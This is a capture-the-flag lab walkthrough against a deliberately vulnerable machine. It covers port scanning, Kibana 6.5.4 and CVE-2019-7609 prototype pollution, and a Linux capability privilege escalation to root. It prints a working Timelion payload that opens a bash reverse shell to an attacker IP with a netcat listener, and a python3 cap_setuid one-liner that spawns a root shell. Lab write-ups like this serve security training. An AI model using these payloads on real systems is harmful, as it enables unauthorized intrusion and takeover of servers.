#### 1. Scanning

```
nmap -sV -p- -T4  10.10.36.51                                         130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-23 07:19 EST

Host is up (0.21s latency).
Not shown: 65483 closed ports, 48 filtered ports
PORT     STATE SERVICE      VERSION
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http         Apache httpd 2.4.18 ((Ubuntu))
5044/tcp open  lxi-evntsvc?
5601/tcp open  esmagent?
```


#### 2. Checking port 80 and website

There is a website on 80 port with a butterfly:

```
		     ,+++77777++=:,                    +=                      ,,++=7++=,,
		    7~?7   +7I77 :,I777  I          77 7+77 7:        ,?777777??~,=+=~I7?,=77 I
		=7I7I~7  ,77: ++:~+777777 7     +77=7 =7I7     ,I777= 77,:~7 +?7, ~7   ~ 777?
		77+7I 777~,,=7~  ,::7=7: 7 77   77: 7 7 +77,7 I777~+777I=   =:,77,77  77 7,777,
		  = 7  ?7 , 7~,~  + 77 ?: :?777 +~77 77? I7777I7I7 777+77   =:, ?7   +7 777?
		      77 ~I == ~77=77777~: I,+77?  7  7:?7? ?7 7 7 77 ~I   7I,,?7 I77~
		       I 7=77~+77+?=:I+~77?     , I 7? 77 7   777~ +7 I+?7  +7~?777,77I
		         =77 77= +7 7777         ,7 7?7:,??7     +7    7   77??+ 7777,
		             =I, I 7+:77?         +7I7?7777 :             :7 7
		                7I7I?77 ~         +7:77,     ~         +7,::7   7
		               ,7~77?7? ?:         7+:77           77 :7777=
		                ?77 +I7+,7         7~  7,+7  ,?       ?7?~?777:
		                   I777=7777 ~     77 :  77 =7+,    I77  777
		                     +      ~?     , + 7    ,, ~I,  = ? ,
		                                    77:I+
		                                    ,7
		                                     :777
		                                        :
				Welcome, "linux capabilities" is very interesting.
```
It tells me nothing at the moment but for sure is a clue to further steps.

I noticed Kibana running on port 5601. 



#### 3.  What is the vulnerability that is specific to programming languages with prototype-based inheritance? 

`prototype pollution`

After googling I found out that it is related with kibana, so we are at home.



#### 4. What is the version of visualization dashboard installed in the server?

I accessed machine on port 5601, select `Management` section and read it's version which is `6.5.4`

6.5.4



#### 5. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

I found it by only typing prototype pollution and it is `CVE-2019-7609`

In a shortcut - we can inject a payload (reverse shell) in Timelion, run it and open Canvas to get shell.

I found a useful website here:

`https://github.com/mpgn/CVE-2019-7609`

First things first as always - we run netcat `sudo nc -lvnp 4444`

We need to type in a payload in Timelion, then run it and click on Canvas section on the left and we should get shell:

```
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.6.46.150/4444 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
````

and I am inside:

```
kiba@ubuntu:/home/kiba/kibana/bin$ whoami
whoami
kiba
kiba@ubuntu:/home/kiba/kibana/bin$ 
```


#### 6. Compromise the machine and locate user.txt

I read user's flag which is in `kiba`'s home:

```
kiba@ubuntu:/home/kiba$ ls -al
ls -al
total 111064
drwxr-xr-x  6 kiba kiba      4096 Jan 22 11:10 .
drwxr-xr-x  3 root root      4096 Mar 31  2020 ..
-rw-rw-r--  1 kiba kiba    407592 Jan 22 11:10 .babel.json
-rw-------  1 kiba kiba      9605 Mar 31  2020 .bash_history
-rw-r--r--  1 kiba kiba       220 Mar 31  2020 .bash_logout
-rw-r--r--  1 kiba kiba      3771 Mar 31  2020 .bashrc
drwx------  2 kiba kiba      4096 Mar 31  2020 .cache
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .hackmeplease
drwxrwxr-x  2 kiba kiba      4096 Mar 31  2020 .nano
-rw-r--r--  1 kiba kiba       655 Mar 31  2020 .profile
-rw-r--r--  1 kiba kiba         0 Mar 31  2020 .sudo_as_admin_successful
-rw-r--r--  1 root root       176 Mar 31  2020 .wget-hsts
-rw-rw-r--  1 kiba kiba 113259798 Dec 19  2018 elasticsearch-6.5.4.deb
drwxrwxr-x 11 kiba kiba      4096 Dec 17  2018 kibana
-rw-rw-r--  1 kiba kiba        35 Mar 31  2020 user.txt
kiba@ubuntu:/home/kiba$ cat user.txt
cat user.txt
THM{1s_****************rce}
```



#### 7. How would you recursively list all of these capabilities?

We need to escalate privleges to root using linux capabilities.

In order to list all files with this attribute we type:

`getcap -r / 2>/dev/null`

`2>/dev/null` ---> discards all error messages.



#### 8. Escalate privileges and obtain root.txt

We get a list of binaries:

```
kiba@ubuntu:/home/kiba/kibana/bin$ getcap -r / 2>/dev/null 
getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

there is a weird one called:

`/home/kiba/.hackmeplease/python3 = cap_setuid+ep`

It seems like custom python installation. In this case, according to GTFO Bins, it is possible to become root like this:

```
$ /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

<please/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'         
id
uid=0(root) gid=1000(kiba) groups=1000(kiba),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare)
```

It is possible to read root flag:

```
 cat /root/root.txt
cat /root/root.txt
THM{pr******************s}
```